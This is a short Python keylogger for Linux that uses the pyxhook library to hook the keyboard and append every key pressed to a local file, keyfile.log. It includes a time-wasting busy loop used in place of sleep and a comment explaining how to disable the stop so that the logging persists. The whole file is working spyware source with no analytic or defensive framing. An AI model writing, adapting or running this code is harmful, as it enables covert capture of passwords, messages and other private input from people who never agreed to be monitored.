import logging
import random
import pyxhook as pyx # Allows for working on linux

# Create the file
logging.basicConfig(filename="keyfile.log", level=logging.INFO)

def key_press(event):
	# When a key is pressed log it
    with open('keyfile.log', 'a') as f:
        f.write('{}\n'.format(event.Key))

# Waste time instead of sleep
def calculator():
	ans = 0
	while ans <= 98324792349:
		ans += random.randint(0, 45)
	keylogger_hook.cancel()


# input hooks
# Required for getting keyboard input
keylogger_hook = pyx.HookManager()
keylogger_hook.KeyDown = key_press

# Stored letters a-z and special characters
# also containts shift keys, return (enter), and more
keylogger_hook.HookKeyboard()

try:
	keylogger_hook.start()
	calculator() # comment out this line for persistance
except KeyboardInterrupt:
	pass
